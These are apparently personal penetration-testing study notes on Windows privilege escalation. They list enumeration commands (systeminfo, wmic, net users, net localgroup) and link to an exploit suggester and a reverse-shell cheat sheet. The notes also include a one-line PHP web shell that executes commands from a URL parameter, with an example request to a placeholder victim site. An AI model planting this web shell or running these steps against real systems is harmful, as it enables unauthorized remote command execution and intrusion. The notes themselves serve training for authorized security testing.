# ariel-shin Windows - Privilege Escalation

## Summary 
* [Tools](#tools)

## MUST RUN: ipconfig/ifconfig && whoami && cat local.txt

## Web Shell for Windows 
PHP Web Shell
- Test if PHP works
```phpinfo
<?php phpinfo(); ?>
```
- Command Execution
```php webshell
<?php echo(system($_GET["cmd"])); ?>
```
- Go to http://victimsite.com/test.php?cmd=dir for command execution 

## Process
- systeminfo
	* Gives us system info 

	* Check Hot Fixes
		* No hot fixes - means no hotfixes installed OR we don't have permissions to view hot fixes

	* Check OS Name
		* google: systeminfo "OS" + "NIC(s) installed"
			* example: "Microosft Windows Server 2008 R2 DataCenter" + "NIC(s) installed"
		* check if someone else has posted systeminfo output so we can compare our OS version 

	* Check OS Versions 
		* Indicate the Service Pack -- N/A
		
		```systeminfo
		systeminfo | findstr /B /C:”OS Name” /C:”OS Version”
		```
		* Google Output
- wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
	* Get architecture
	* x86 = 32 bit machine
	* x64 = 64 bit machine
- Environment Variables
	* Command Prompt
	```env
	set
	```
	* PowerShell
	```
	Get-ChildItem Env: | ft Key,Value
	```
- net users
	* See the users 
- net localgroup Administrator(s)
	* See which users are in the Administrator Group




sc -- tells you what program is running
systeminternals
accesschk.exe


## Automated Tools
* [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

## Cheat Sheets
* [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
)

## Links
* [Spreadsheet with Resources](https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=2075148101)